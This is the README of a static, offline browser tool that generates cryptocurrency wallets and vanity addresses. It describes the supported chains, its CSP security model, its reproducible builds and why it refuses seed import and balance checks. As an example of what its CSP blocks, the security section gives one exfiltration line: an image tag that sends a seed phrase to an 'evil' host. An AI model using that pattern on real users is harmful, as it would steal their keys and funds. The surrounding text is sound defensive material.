# cryptostack-wallet-generator

A crypto wallet generator that runs entirely in the browser, as five static HTML files.

**[finland93.github.io/cryptostack-wallet-generator](https://finland93.github.io/cryptostack-wallet-generator/)**

No server. No RPC calls. No telemetry. No balance checks. Every page is one self-contained
file — download it, unplug the machine, open it from a folder. It fetches nothing, ever.

## The site

| Page | For |
|---|---|
| `index.html` | What it is, which chains, what it will not do |
| `vanity-address-generator.html` | Prefix/suffix addresses — ETH, BTC, SOL, TRON |
| `bip39-seed-phrase-generator.html` | Generates a 12–24 word phrase → BTC, ETH, SOL, TRON addresses |
| `vanity-address-risks.html` | What a prefix costs, Profanity/Wintermute, address poisoning |
| `wallet-security-guide.html` | What protects your keys here, what does not |

Five pages rather than one page with tabs, because a tab is not a URL. One URL carries one
title, one description and one `<h1>`, so a tabbed site competes for one set of search terms
no matter how much is written on it. Someone searching *is a vanity address safe* and someone
searching *bip39 seed phrase generator* want different pages, and now they get them.

Each page has its own title, description, canonical, Open Graph and Twitter tags, JSON-LD and
`<h1>`, all generated from `src/site.js`, plus `robots.txt` and `sitemap.xml`. The risk and
security writing is real markup, not text painted in by JavaScript, so a crawler reads it
without executing anything. The two prose pages ship no JavaScript at all.

## Chains

| Chain | Path | Starts with | Vanity | Seed |
|---|---|---|---|---|
| Ethereum / EVM | `m/44'/60'/{a}'/0/{i}` | `0x` | ✓ | ✓ |
| Bitcoin — Native SegWit (BIP-84) | `m/84'/0'/{a}'/0/{i}` | `bc1q` | ✓ | ✓ |
| Bitcoin — Taproot (BIP-86) | `m/86'/0'/{a}'/0/{i}` | `bc1p` | ✓ | ✓ |
| Bitcoin — Legacy (BIP-44) | `m/44'/0'/{a}'/0/{i}` | `1` | ✓ | ✓ |
| Bitcoin — Nested SegWit (BIP-49) | `m/49'/0'/{a}'/0/{i}` | `3` | — | ✓ |
| Solana | `m/44'/501'/{a}'/0'` | — | ✓ | ✓ |
| TRON | `m/44'/195'/{a}'/0/{i}` | `T` | ✓ | ✓ |

The EVM address is the same on Polygon, BNB Chain, Arbitrum, Optimism, Base and Avalanche
C-Chain. Adding a chain is one entry in `src/core/chains.js`.

## What it deliberately does not do

**There is nowhere to type an existing seed phrase.** The seed page generates; it does not import.
"Paste your seed phrase into this website" is the shape of every seed-phrase phishing page there
has ever been, and a tool cannot print that warning above a box that does exactly it and expect
the warning to win. It is also one function away from the wrong program: the tool this replaced
generated random mnemonics, derived their addresses and asked an RPC which held money — delete
the RPC call and you have an import box. To check a phrase you already have, restore it in the
wallet you actually intend to use, offline. That tests the wallet you will trust, not this page.

The phrase never touches a form control either: it lives in a local variable and reaches the DOM
only as `textContent`, inside a blurred grid. An input's `value` gets autofilled, offered to the
password manager, restored on back-navigation and kept in the bfcache. A variable is none of that.

**It does not check the balances of the wallets it generates.** Not now, not behind a setting.

- Checking a balance means sending an address to somebody's RPC server, which from that moment
  knows the address and your IP belong together. A freshly generated wallet whose balance you
  "just checked" is not private any more.
- A tool that generates wallets **and** checks their balances is not a wallet generator. It is
  a cracking tool: the only reason to check balances on randomly drawn keys is to go looking
  for someone else's money. This project replaced two earlier tools that did exactly that.

The rule is enforced by the browser, not by a promise: every page's CSP contains
`connect-src 'none'`, so `fetch`, `XMLHttpRequest`, WebSocket, `EventSource` and `sendBeacon`
are all refused — including if the page's own JavaScript turns hostile.

## Publishing it

1. If you fork or rename this, edit `homepage` and `repository.url` in `package.json`, then run
   `npm run build`. Every canonical, Open Graph URL, JSON-LD block, sitemap entry and footer
   source link is written from those two fields — there is no third place to remember.
2. Push, then **Settings → Pages → Source: GitHub Actions**.

Not *Deploy from a branch*: that publishes whatever is on the branch, tests passed or not. The
workflow deploys only after both gates are green and uploads the committed files rather than
rebuilding them, so the bytes served are bytes a human read in a diff.

The built pages are committed on purpose. Pages serves what is in git, a download from git is
byte-identical to it, and CI proves both match `src/`.

## Security model

The threat: somebody gets JavaScript onto the page that steals a seed phrase. Dependency
hijack, compromised repository, man-in-the-middle.

1. **`connect-src 'none'`** — the important one. A stolen key has nowhere to go. `img-src` is
   restricted to `data:`, `font-src` too, `form-action` is `'none'`: each is an exfiltration
   channel left open otherwise. `<img src="https://evil/?seed=…">` works as well as `fetch`.
2. **The script is pinned by its own hash.** `script-src 'sha256-…'` names the SHA-256 of the
   one inline script; no `'self'`, no other source. The browser recomputes it every load and
   runs the code only on an exact match. Change one byte and it runs *nothing* — and the page
   says so instead of sitting blank. Same guarantee SRI gives an external file, and stronger in
   one way: an injected script tag cannot match a hash computed before it existed. The prose
   pages carry the hash of the empty string — a source nothing can match.
3. **Nothing is fetched at all.** No CDN, no Google Fonts, no analytics, no subresources: fonts
   are `data:` URLs, the crypto is inline, the worker travels as a string and starts from a
   blob. This is what makes the pages work from a folder, and why there is no runtime supply
   chain to attack.
4. **Reproducible build.** `npm run verify` rebuilds from `src/` and requires byte-identical
   output. Output that drifts from its source is what a supply-chain attack looks like. CI runs
   it on every push.
5. **Unminified.** The cryptography is readable in the page you are running it in — diff it
   against [@noble](https://github.com/paulmillr/noble-curves) and
   [@scure](https://github.com/paulmillr/scure-bip39). A minified bundle is where a backdoor
   hides.
6. **No `innerHTML` anywhere.** The interface is built from `textContent` and `value`. No
   `localStorage`, no `sessionStorage` — sealed to throw, so a phrase cannot reach disk.
7. **Prototypes frozen** before the cryptography is evaluated, natives snapshotted.
8. **Randomness only from `crypto.getRandomValues`.** No mouse wiggling, no dice, no "extra
   entropy" — homemade entropy is a way to make a CSPRNG worse.

### What none of that stops

- **Browser extensions.** Content scripts run in an isolated world with their own privileges
  and the page's CSP does not bind them. An extension allowed to read page content can read a
  seed phrase.
- **A compromised OS.** Keyloggers, screen capture, clipboard snooping.
- **A page modified consistently.** The CSP guarantees the script matches the hash the page
  declares. Rewrite both and they still match. That is what `SHA256SUMS` is for — and the fact
  that it is published somewhere other than the file it describes.
- **You.** A screenshot of a seed phrase is a screenshot of a seed phrase. Cloud-backed up.
  Synced. Forever.

## Check that you got the right bytes

```bash
git clone https://github.com/finland93/cryptostack-wallet-generator.git
cd cryptostack-wallet-generator
npm ci

npm run verify          # rebuilds from src/, demands identical bytes
sha256sum -c SHA256SUMS
npm test                # 50 tests
```

One page is one file, so one hash covers a whole application — app, cryptography, styles, fonts
and worker together.

`npm test` does not check the code against itself. It cross-validates every derivation against
two independent sources: the official vectors from BIP-39, BIP-49, BIP-84, BIP-86 and SLIP-0010,
**and** other libraries (`ethers`, `bitcoinjs-lib`, `bip32`, `tiny-secp256k1`) implementing the
same specs with different code. `test/invariants.test.mjs` checks the claims on this page
instead of the arithmetic: no page references `fetch` or any other way out; no remote URL is
hardcoded; nothing touches `localStorage`; no first-party code builds DOM from strings; every
CSP still says what it says above and its hashes still cover the blocks they name; every page
has a distinct title, description, canonical and `<h1>`. It reads code as a parsed syntax tree
rather than as text, so a comment mentioning `fetch` cannot trip it and a real call cannot hide.

## Development

```bash
npm ci
npm run build      # src/ -> the five pages, robots.txt, sitemap.xml, SHA256SUMS
npm run serve      # http://127.0.0.1:8080 — only needed to test the hosted path
npm test
npm run verify     # what CI runs
npm run reachable  # measure reachable characters and throughput per chain
```

You never need `serve` to use the tool: open the files from a folder. It exists to check what
Pages will do before pushing.

```
src/
  site.js             every page: slug, title, description, h1, which script
  layout.html         the shell each page is poured into
  pages/_*.body.html  the body of each page
  main.css            the whole stylesheet
  entry.vanity.js     what the vanity page runs
  entry.seed.js       what the seed page runs
  ui/                 common.js, vanity.js, seed.js
  vanity.worker.js    search thread, one per core
  core/               chains, codec, derive, slip10, vanity, security, i18n
tools/build.mjs       inlines everything into each page + the --check drift test
test/                 derive.test.mjs, invariants.test.mjs
```

### Why the search is fast

On secp256k1 chains a new key is not drawn per attempt. One 256-bit base scalar `k` is drawn,
`k·G` computed once, and the search walks `k+1, k+2, …` by point addition — roughly 50× cheaper
than scalar multiplication. The base scalar is re-randomised every 2²⁰ steps and a run returns
one result, so found keys are unrelated. Solana cannot use the trick: ed25519 hashes the seed
with SHA-512 before the scalar, so consecutive keys give unrelated points.

Measured (addresses/sec/core, ordinary laptop): Bitcoin bech32 ~11,600 · Bitcoin legacy ~10,400
· Ethereum ~9,500 · TRON ~9,300 · Solana ~3,800 · Bitcoin Taproot ~1,600.

## Dependencies

Five packages, all from Paul Miller's @noble/@scure family: zero-dependency, audited, no network
code anywhere in them.

`@noble/curves` · `@noble/hashes` · `@scure/base` · `@scure/bip32` · `@scure/bip39`

Pinned exactly, no `^`. Everything else — esbuild, ethers, bitcoinjs-lib, acorn, the fonts — is
a dev dependency and never reaches a page. (The fonts do, as bytes.) The test dependencies are
deliberately not the runtime ones: validating `@scure/bip39` with `@scure/bip39` would only
prove it agrees with itself.

## License

[MIT](LICENSE). If you publish a modified version, replace `SHA256SUMS` with your own — don't
let anyone compare your build against these hashes and think they match.
